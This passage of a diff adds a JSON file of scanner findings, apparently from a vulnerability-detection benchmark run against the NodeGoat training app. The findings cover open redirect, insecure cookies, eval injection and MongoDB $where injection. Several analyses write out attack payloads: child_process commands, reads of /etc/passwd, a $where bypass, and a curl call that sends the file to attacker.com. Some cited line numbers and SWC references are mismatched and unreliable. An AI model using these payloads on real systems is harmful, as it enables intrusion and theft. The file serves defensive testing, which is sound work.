A03:2021-Injection, SWC-136",
+  "documented_entries_for_this_file": [
+   {
+    "id": "Server-Side JS Injection (eval)",
+    "file": "app/routes/contributions.js",
+    "category": "ssji"
+   }
+  ]
+ },
+ {
+  "id": "nodegoat-0017",
+  "benchmark": "nodegoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/nodegoat",
+  "file": "app/routes/index.js",
+  "line": 72,
+  "end_line": 72,
+  "rule_id": "express_open_redirect",
+  "cwe": "cwe-601",
+  "scanner_message": "Untrusted user input in redirect() can result in Open Redirect vulnerability. An http parameter may contain a URL value and could cause the web application to redirect the request to the specified URL. By modifying the URL value to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials. Because the server name in the modified link is identical to the original site, phishing attempts have a more trustworthy appearance. Whether this issue poses a vulnerability will be subject to the intended behavior of the application. For example, a search engine might intentionally provide redirects to arbitrary URLs.",
+  "snippet": "    app.get(\"/learn\", isLoggedIn, (req, res) => {\n        // Insecure way to handle redirects by taking redirect url from query string\n        return res.redirect(req.query.url);\n    });",
+  "detector_analysis": "Confirmed: yes\nSeverity: high\n\n## Impact\nAn attacker can craft a phishing link via the `/learn` endpoint that redirects users to arbitrary external domains (e.g., `https://malicious-site.com?url=https://evil.com/login`). Because the redirect originates from the trusted domain (`/learn`), users may trust the link and enter credentials on the attacker-controlled site, enabling credential theft. The invariant violated is *user trust in origin integrity* — the application delegates full redirect control to untrusted input without validation.\n\n## Attack Scenario\n1. Attacker constructs a URL: `https://victim-app.com/learn?url=https://evil.com/phish`.\n2. User clicks the link while authenticated (e.g., via email phishing).\n3. The `/learn` route (line 62–65 in `app/routes/index.js`) reads `req.query.url` and passes it directly to `res.redirect()` (Express’s `res.redirect()` accepts absolute URLs).\n4. User is redirected to `https://evil.com/phish`, which mimics the login page.\n5. User enters credentials, which are captured by the attacker.\n\n## Recommendation\nPrimary fix: Validate and restrict redirect URLs to a known-safe allowlist of domains or relative paths. For Express, sanitize `req.query.url` before redirecting:\n\n```js\napp.get(\"/learn\", isLoggedIn, (req, res) => {\n    const url = req.query.url;\n    if (!url || !url.startsWith('/')) {\n        // Reject absolute URLs or non-relative paths\n        return res.redirect('/dashboard');\n    }\n    // Optionally, further restrict to known internal paths\n    if (!/^\\/(learn|dashboard|profile|research|benefits|contributions|allocations|memos)$/i.test(url)) {\n        return res.redirect('/dashboard');\n    }\n    return res.redirect(url);\n});\n```\n\nDefense in depth: Set `X-Frame-Options: DENY` and `Content-Security-Policy: frame-ancestors 'self'` to mitigate phishing impact; log redirect attempts for monitoring.\n\nReferences: OWASP A1:2021 – Broken Access Control, CWE-601, SWC-136",
+  "documented_entries_for_this_file": []
+ },
+ {
+  "id": "nodegoat-0023",
+  "benchmark": "nodegoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/nodegoat",
+  "file": "app/routes/index.js",
+  "line": 72,
+  "end_line": 72,
+  "rule_id": "express-open-redirect",
+  "cwe": [
+   "CWE-601: URL Redirection to Untrusted Site ('Open Redirect')"
+  ],
+  "scanner_message": "The application redirects to a URL specified by user-supplied input `req` that is not validated. This could redirect users to malicious locations. Consider using an allow-list approach to validate URLs, or warn users they are being redirected to a third-party website.",
+  "snippet": "    app.get(\"/learn\", isLoggedIn, (req, res) => {\n        // Insecure way to handle redirects by taking redirect url from query string\n        return res.redirect(req.query.url);\n    });",
+  "detector_analysis": "Confirmed: yes\nSeverity: high\n\n## Impact\nAn attacker can craft a malicious link to `/learn?url=https://evil.com` that, when clicked by an authenticated user, redirects them to a phishing or malware site while preserving the user's session cookie — enabling session hijacking, credential theft, or social engineering attacks. The vulnerable endpoint is `app.get(\"/learn\", ...)` in `app/routes/index.js`, which directly uses `req.query.url` in `res.redirect()` without validation, violating the integrity and confidentiality of user sessions.\n\n## Attack Scenario\n1. Attacker crafts a URL such as `https://victim-app.com/learn?url=https://malicious-site.com`.\n2. Authenticated victim clicks the link while logged into the application.\n3. The `/learn` route executes line 52: `return res.redirect(req.query.url);`, sending a 302 redirect to the attacker-controlled domain.\n4. The victim's browser navigates to the malicious site with the same-origin session cookie included (if the site is same-site or if cookie policies are misconfigured), or the attacker can mimic the app's UI to harvest credentials or perform actions on behalf of the user.\n5. Post-condition: the attacker gains access to the victim's authenticated context or sensitive user data.\n\n## Recommendation\nPrimary fix: Validate and sanitize the redirect URL before use. Implement a strict allow-list of known-safe domains (e.g., `[\"https://trusted-learn.example.com\"]`) and reject any URL not in the list. Alternatively, use a relative-path-only policy (e.g., strip protocol and host, redirect only to paths like `/learn/external/123` which resolves server-side to a safe redirect target).\n\nDefense in depth: Set `SameSite=Strict` or `Lax` on session cookies to limit cross-site leakage; use Content-Security-Policy `frame-ancestors` and `report-uri` to detect abuse; log and alert on unexpected redirect destinations.\n\nReferences: CWE-601, OWASP A1:2021 – Broken Access Control, SWC-105",
+  "documented_entries_for_this_file": []
+ },
+ {
+  "id": "nodegoat-0042",
+  "benchmark": "nodegoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/nodegoat",
+  "file": "server.js",
+  "line": 78,
+  "end_line": 102,
+  "rule_id": "express-cookie-session-no-secure",
+  "cwe": [
+   "CWE-522: Insufficiently Protected Credentials"
+  ],
+  "scanner_message": "Default session middleware settings: `secure` not set. It ensures the browser only sends the cookie over HTTPS.",
+  "snippet": "\n    // Enable session management using express middleware\n    app.use(session({\n        // genid: (req) => {\n        //    return genuuid() // use UUIDs for session IDs\n        //},\n        secret: cookieSecret,\n        // Both mandatory in Express v4\n        saveUninitialized: true,\n        resave: true\n        /*\n        // Fix for A5 - Security MisConfig\n        // Use generic cookie name\n        key: \"sessionId\",\n        */\n\n        /*\n        // Fix for A3 - XSS\n        // TODO: Add \"maxAge\"\n        cookie: {\n            httpOnly: true\n            // Remember to start an HTTPS server to get this working\n            // secure: true\n        }\n        */\n\n    }));\n\n    /*",
+  "detector_analysis": "Confirmed: yes\nSeverity: high\n\n## Impact\nAn attacker can hijack user sessions via network eavesdropping on unencrypted HTTP connections because the `secure` flag is not set on the session cookie, allowing the browser to transmit session cookies over plaintext HTTP. This directly compromises the confidentiality and integrity of authenticated user sessions, enabling session fixation or session theft attacks that could lead to unauthorized access to user accounts and sensitive data.\n\n## Attack Scenario\n1. The application uses `express-session` middleware without setting `cookie.secure = true` (server.js, lines 3–22).\n2. When a user logs in over HTTP (or if the server is misconfigured to serve on HTTP), the browser stores the session cookie without the `Secure` attribute.\n3. An attacker on the same network (e.g., public Wi-Fi, compromised router, or via ARP spoofing) can intercept HTTP traffic and capture the session cookie in plaintext.\n4. The attacker replays the captured cookie in their own browser to impersonate the victim user, gaining full access to the authenticated session.\n5. Post-condition: Attacker gains unauthorized access to victim’s account without needing credentials.\n\n## Recommendation\nPrimary fix: Explicitly set `cookie.secure = true` in the session configuration, and ensure the application is served over HTTPS in production. Update the configuration as follows:\n\n```js\napp.use(session({\n  secret: cookieSecret,\n  saveUninitialized: true,\n  resave: true,\n  cookie: {\n    httpOnly: true,\n    secure: true,  // ← required for production\n    sameSite: 'lax' // optional but recommended\n  }\n}));\n```\n\nDefense in depth: Enforce HTTPS via `app.enable('trust proxy')` (if behind a reverse proxy like Nginx), use HSTS headers, and deploy a redirect middleware to upgrade HTTP → HTTPS.\n\nReferences: CWE-522, OWASP A01:2021 – Broken Access Control, OWASP A02:2021 – Cryptographic Failures, SWC-127",
+  "documented_entries_for_this_file": []
+ },
+ {
+  "id": "nodegoat-0004",
+  "benchmark": "nodegoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/nodegoat",
+  "file": "app/routes/contributions.js",
+  "line": 33,
+  "end_line": 33,
+  "rule_id": "nodejs-eval-request-input",
+  "cwe": "CWE-95",
+  "scanner_message": "eval()/Function() on request-derived data — server-side JS injection (arbitrary code execution). Parse with a safe parser instead.",
+  "snippet": "        // Insecure use of eval() to parse inputs\n        const preTax = eval(req.body.preTax);\n        const afterTax = eval(req.body.afterTax);\n        const roth = eval(req.body.roth);",
+  "detector_analysis": "Confirmed: yes\nSeverity: critical\n\n## Impact\nAn attacker can execute arbitrary server-side JavaScript code by injecting malicious payloads into the `preTax`, `afterTax`, or `roth` request body fields, leading to full remote code execution (RCE) on the Node.js server. This compromises confidentiality (e.g., reading environment variables, database credentials), integrity (e.g., modifying or deleting user data), and availability (e.g., crashing the service). The invariant violated is \"user-controlled input must never be passed to dynamic code evaluation primitives\".\n\n## Attack Scenario\n1. Attacker sends a POST request to `/contributions/update` with `req.body.preTax` set to a malicious JS expression, e.g., `process.exit(0)` or `require('child_process').execSync('whoami')`.\n2. Line 27: `eval(req.body.preTax)` executes the payload in the server context.\n3. Because `eval()` runs with full access to the Node.js runtime, the attacker can:\n   - Read sensitive files (e.g., `fs.readFileSync('/etc/passwd')`)\n   - Exfiltrate environment variables (e.g., `process.env.DATABASE_URL`)\n   - Spawn reverse shells via `child_process`\n   - Modify database records through `contributionsDAO`\n4. Post-condition: arbitrary code executes on the server with the privileges of the Node.js process.\n\n## Recommendation\nPrimary fix: Replace `eval()` with `parseInt()` (as shown in the commented-out fix) or `Number()` for numeric parsing, and validate input type strictly before use. The current validation (`isNaN(...)`) is insufficient because `eval()` executes before validation occurs.\n\nCWE-95 (Improper Control of Generation of Code ('Code Injection')) — this is a textbook case of server-side JS injection via `eval()` on unsanitized user input.\n\nReferences: CWE-95, OWASP A1:2021 (Injection), SWC-134 (Eval in JavaScript)",
+  "documented_entries_for_this_file": [
+   {
+    "id": "Server-Side JS Injection (eval)",
+    "file": "app/routes/contributions.js",
+    "category": "ssji"
+   }
+  ]
+ },
+ {
+  "id": "nodegoat-0000",
+  "benchmark": "nodegoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/nodegoat",
+  "file": "app/data/allocations-dao.js",
+  "line": 77,
+  "end_line": 79,
+  "rule_id": "nodejs-nosql-where-injection",
+  "cwe": "CWE-943",
+  "scanner_message": "MongoDB $where query with interpolated/concatenated input. $where runs arbitrary JS server-side; any user-controlled value enables NoSQL injection and SSJI. Use a typed query operator, never $where with input.",
+  "snippet": "                throw `The user supplied threshold: ${parsedThreshold} was not valid.`;\n                */\n                return {\n                    $where: `this.userId == ${parsedUserId} && this.stocks > '${threshold}'`\n                };\n            }\n            return {",
+  "detector_analysis": "Confirmed: yes\nSeverity: critical\n\n## Impact\nAn attacker can inject arbitrary JavaScript code into MongoDB's `$where` clause via the `threshold` parameter in `AllocationsDAO.getByUserIdAndThreshold`, enabling server-side JavaScript injection (SSJI). This allows full database compromise — reading, modifying, or deleting any document — and potentially remote code execution depending on MongoDB's security configuration. The invariant violated is \"user-controlled input must never be interpolated into `$where` queries\", and the asset at risk is the integrity and confidentiality of the `allocations` collection.\n\n## Attack Scenario\n1. Attacker calls `getByUserIdAndThreshold(userId, threshold, callback)` with `threshold = \"0'; return true; //\"` (line 78–80 in `searchCriteria`).\n2. The template literal constructs `$where: \"this.userId == 123 && this.stocks > '0'; return true; //'\"`.\n3. MongoDB evaluates the `$where` expression as JavaScript: the injected `return true;` overrides the condition, causing the query to match *all* documents in the collection.\n4. Attacker receives full allocation data for all users, bypassing the `userId` filter entirely.\n5. More severe payloads like `0'; db.adminCommand({shutdown:1}); //` could trigger shutdown or other privileged operations if the MongoDB user has such permissions.\n\n## Recommendation\nPrimary fix: Replace the `$where` query with a typed range query using `$gt`, e.g. `this.stocks > parseInt(threshold, 10)`, and validate `threshold` as an integer in `[0, 99]` before use. Remove the commented-out fix — it is dead code and misleading.\n\nDefense in depth: Enforce strict input validation at the API boundary (e.g., Express middleware), and configure MongoDB with `security.authorization: enabled` and `security.javascriptEnabled: false` to disable `$where` entirely.\n\nReferences: CWE-943, OWASP A03:2021-Injection, SWC-134",
+  "documented_entries_for_this_file": [
+   {
+    "id": "NoSQL Injection ($where)",
+    "file": "app/data/allocations-dao.js",
+    "category": "nosql_injection"
+   }
+  ]
+ },
+ {
+  "id": "nodegoat-0007",
+  "benchmark": "nodegoat",
+  "source_root": "<BENCHMARK_CHECKOUTS>/nodegoat",
+  "file": "app/routes/contributions.js",
+  "line": 33,
+  "end_line": 33,
+  "rule_id": "eval_nodejs",
+  "cwe": "cwe-95",
+  "scanner_message": "User controlled data in eval() or similar functions may result in Server Side Injection or Remote Code Injection",
+  "snippet": "        // Insecure use of eval() to parse inputs\n        const preTax = eval(req.body.preTax);\n        const afterTax = eval(req.body.afterTax);\n        const roth = eval(req.body.roth);",
+  "detector_analysis": "Confirmed: yes\nSeverity: critical\n\n## Impact\nAn attacker can execute arbitrary server-side JavaScript or Node.js code by injecting malicious payloads into the `preTax`, `afterTax`, or `roth` request body fields, leading to full remote code execution (RCE) on the server. The `eval()` calls directly interpret user-controlled input without sanitization or validation, bypassing the subsequent `isNaN()` checks — for example, `eval(\"1; require('child_process').exec('id')\")` returns `1` (passing `isNaN`) while executing arbitrary code. This compromises confidentiality (data exfiltration), integrity (arbitrary code execution), and availability (service shutdown).\n\n## Attack Scenario\n1. Attacker sends a POST request to `/contributions/update` with `req.body.preTax = \"1; require('child_process').exec('curl http://attacker.com/steal?data=' + require('fs').readFileSync('/etc/passwd'))\"` and `req.body.afterTax = \"0\"`, `req.body.roth = \"0\"`.\n2. In `handleContributionsUpdate`, line 28–30, `eval(req.body.preTax)` executes the injected payload: the `1` evaluates to a truthy value (so `isNaN(preTax)` returns `false`), but the `; require(...)` part executes as a separate statement, spawning a child process.\n3. The `isNaN()` checks on lines 33–34 pass because `preTax` evaluates to `1`, and the malicious code runs before any validation error is returned.\n4. Attacker receives `/etc/passwd` content at their controlled endpoint, or executes any other system command.\n\n## Recommendation\nPrimary fix: Replace all `eval()` calls with safe parsing — uncomment and deploy the `parseInt()` fallback already present in the commented-out code (lines 37–39), or use `Number()` with explicit type checks. Ensure input is strictly numeric before assignment.\n\nDefense in depth: Add input validation middleware that rejects non-numeric strings before reaching the handler; log and alert on malformed contribution payloads; apply Content Security Policy headers to mitigate secondary injection vectors.\n\nReferences: CWE-95, OWASP A03:2021-Injection, SWC-116",
+  "documented_entries_for_this_file": [
+   {
+    "id": "Server-Side JS Injection (eval)",
+    "file": "app/routes/contributions.js",
+    "category": "ssji"
+   }
+  ]
+ }
+]
